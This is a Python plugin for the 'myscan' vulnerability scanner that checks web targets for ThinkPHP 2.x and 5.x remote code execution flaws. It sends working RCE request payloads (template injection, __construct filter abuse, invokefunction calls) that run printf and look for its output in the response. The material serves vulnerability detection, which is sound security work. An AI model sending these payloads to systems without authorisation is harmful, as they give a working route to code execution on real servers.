#!/usr/bin/env python3
# @Time    : 2020-06-13
# @Author  : caicai
# @File    : poc_thinkphp_rce_all_2020.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_str, get_random_num
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "thinkphp rce"
        self.vulmsg = "thinkphp rce"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        # if self.dictdata.get("url").get("extension").lower()[:3] not in ["", "php"]:
        #     return
        # thinkphp 2.x
        rand_num1, rand_num2 = get_random_num(4), get_random_num(4)
        total = rand_num2 * rand_num1
        req = {
            "method": "GET",
            "url": self.url + "index.php?s=/aa/bb/name/${@printf(%s*%s)}" % (rand_num1, rand_num2),
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
            "allow_redirects": False
        }
        r = request(**req)
        if r is not None and str(total).encode() in r.content:
            self.save(r,
                      "exec {}*{},{} in response".format(rand_num1, rand_num2, total),
                      "referer:{}".format("https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce")
                      )
        # thinkphp 5.0.23-rce
        success = False
        rand_str1, rand_str2 = get_random_str(5), get_random_str(5)
        payload = "{}%%{}".format(rand_str1, rand_str2)
        show = "{}%{}".format(rand_str1, rand_str2)
        for path in ["index.php?s=captcha", "index.php/captcha"]:
            req = {
                "method": "POST",
                "url": self.url + path,
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                },  # 主要保留cookie等headers
                "data": "_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]={}&get[]=1".format(
                    payload),
                "timeout": 10,
                "verify": False,
                "allow_redirects": False
            }
            r = request(**req)
            if r is not None and show.encode() in r.content:
                self.save(r,
                          "{} in response".format(show),
                          "referer:https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md"
                          )
                success = True
                break
        if not success:
            req = {
                "method": "POST",
                "url": self.url,
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                },  # 主要保留cookie等headers
                "data": "get[]={}&_method=__construct&method=get&filter=printf".format(
                    payload),
                "timeout": 10,
                "verify": False,
                "allow_redirects": False
            }
            r = request(**req)
            if r is not None and show.encode() in r.content:
                self.save(r,
                          "{} in response".format(show),
                          "referer:https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md"
                          )

        # thinkphp 5.0.22/5.1.29 rce
        rand_str1, rand_str2 = get_random_str(5), get_random_str(5)
        payload = "{}%%{}".format(rand_str1, rand_str2)
        show = "{}%{}".format(rand_str1, rand_str2)
        for path in ["index.php/Index/%5Cthink%5Capp/invokefunction", r"index.php?s=/Index/\think\app/invokefunction"]:
            req = {
                "method": "POST",
                "url": self.url + path,
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                },  # 主要保留cookie等headers
                "data": "function=call_user_func_array&vars[0]=printf&vars[1][]={}".format(payload),
                "timeout": 10,
                "verify": False,
                "allow_redirects": False
            }
            r = request(**req)
            if r is not None and show.encode() in r.content:
                self.save(r,
                          "{} in response".format(show),
                          "referer:https://github.com/vulhub/vulhub/blob/master/thinkphp/5-rce/README.zh-cn.md"
                          )
                break

    def save(self, r, others, vulmsg):
        parser_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": parser_.geturl(),
            "level": 2,  # 0:Low  1:Medium 2:High
            "detail": {
                "others": others,
                "vulmsg": vulmsg,
                "request": parser_.getrequestraw(),
                "response": parser_.getresponseraw()
            }
        })
